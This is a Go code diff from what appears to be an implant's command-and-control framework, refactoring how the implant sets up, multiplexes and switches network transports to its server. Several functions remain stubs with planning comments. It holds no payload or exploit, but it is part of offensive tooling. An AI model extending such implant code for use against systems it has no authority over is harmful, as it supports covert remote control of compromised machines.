@@ -41,7 +41,7 @@ type Transport interface {
 // NOTE: A transport is obviously and necessarily a physical connection.
 // The logical connection used for C2 requests/responses (muxed) is nonetheless owned by this transport.
 type transport struct {
-	Info        tpb.Transport      // Information
+	Info        *tpb.Transport     // Information
 	Ready       bool               // This is a check, in case the connection is just out of a switch and not yet working.
 	Conn        net.Conn           // Physical connection, which might/will be muxed. We might need access from time to time.
 	C2          io.ReadWriteCloser // Logical connection used for C2 requests/responses (muxed), on top of the Conn.
@@ -51,19 +51,13 @@ type transport struct {
 
 // Setup - Takes care of boilerplate logging, multiplexing, adding RPC C2 code to the
 // implant's main channel, and adds the transport to the Transport list.
-func (t *transport) Setup(isSwitch bool) (err error) {
+func (t *transport) Setup() (err error) {
 
 	tpLog.Infof("Starting transport (ID: %d)", t.Info.ID)
 	tpLog.Infof("Protocol: %s", t.Info.Protocol.String())
 	tpLog.Infof("Address: %s:%d", t.Info.RHost, t.Info.LPort)
 
 	// Add job to channels, or just to a list for tracking current routines.
-
-	// Send registration
-	if isSwitch {
-		// Send switch confirmation
-	}
-	// Else, send registration message with information
 
 	// Setup multiplexer
 	t.Multiplexer, err = yamux.Server(t.Conn, yamux.DefaultConfig())
@@ -74,15 +68,13 @@ func (t *transport) Setup(isSwitch bool) (err error) {
 	// Get a stream dedicated to implant C2 requests/responses. The server received
 	// or registration/connection request, and will soon try to initiate a mux.
 	if t.Multiplexer != nil {
-		t.C2, err = t.Multiplexer.Accept()
+		t.C2, err = t.Multiplexer.Open()
 		if err != nil || t.C2 == nil {
 			tpLog.Errorf("Failed to get C2 muxed stream: %s", err.Error())
 			t.emergencyConnSetup()
 		}
 		err = rpc.SetupStreamRPC(t.C2)
 	}
-
-	// Bind this stream to the implant's main channel
 
 	Transports.Active = t // This transport is now the active one for this implant.
 
@@ -96,16 +88,17 @@ func (t *transport) Stop() (err error) {
 
 	tpLog.Infof("Stopping transport (ID: %d)", t.Info.ID)
 
-	// Remove job from channels
-
 	// Check routed connections. We need to devise how permissions
 	// determine if a user can cutoff/switch a transport.
 
-	// Stopping the transport means closing the multiplexer, terminating the physical connection
-	// (which implies that the server, who has sent a request to either stop/switch, will NOT
-	// receive the response, worst it will get a fatal error from conn.Close().
-	// Thus these requests to switch/stop a transport must be done, server-side, through a function
-	// that takes this conn switch into account.
+	// Also, we need to close all chans and any code using these streams, such as the RPC layer
+
+	// We have sent a request to the server already, so that all muxed conns should be stopped,
+	// and we can safely close the Main channel C2, as well as the multiplexer
+
+	// Then we close the physical connection, last.
+
+	// Remove job if stored somewhere
 
 	return
 }
@@ -133,7 +126,7 @@ type transports struct {
 }
 
 // Switch - Change the active transport for this ghost
-func (tp *transports) Switch(to tpb.Transport) (err error) {
+func (tp *transports) Switch(to *tpb.Transport) (err error) {
 
 	tpLog.Warnf("Switching transport stack for implant")
 	tp.mutex.Lock()
@@ -142,11 +135,15 @@ func (tp *transports) Switch(to tpb.Transport) (err error) {
 	// Makes two working simultaneously, but if there is some
 	// remote logging it's better to send it via the old conn.
 	new := (*tp.Ready)[uint64(to.ID)]
-	err = new.Setup(true)
+	err = new.Setup() // We have to change this to Start()
 	if err != nil {
-		// Do something here, like send an abort message, via old transport
+		// Log the error (should be about multiplexer)
+		// this will be forwarded to the server by the log system.
 		return
 	}
+
+	// We send a request to the server, notifying the implant is ready,
+	// multiplexer, RPC code, etc.
 
 	// Stop old transport
 	if tp.Active != nil {
@@ -165,7 +162,7 @@ func (tp *transports) Switch(to tpb.Transport) (err error) {
 }
 
 // Add - User requested to add a transport, with option to use it now
-func (tp *transports) Add(new tpb.Transport, use bool) (err error) {
+func (tp *transports) Add(new *tpb.Transport, use bool) (err error) {
 
 	t := &transport{
 		Info:  new,
@@ -184,7 +181,7 @@ func (tp *transports) Add(new tpb.Transport, use bool) (err error) {
 }
 
 // Remove - User requested to remove a transport from the list.
-func (tp *transports) Remove(new tpb.Transport, use bool) (err error) {
+func (tp *transports) Remove(new *tpb.Transport, use bool) (err error) {
 	return
 }
 
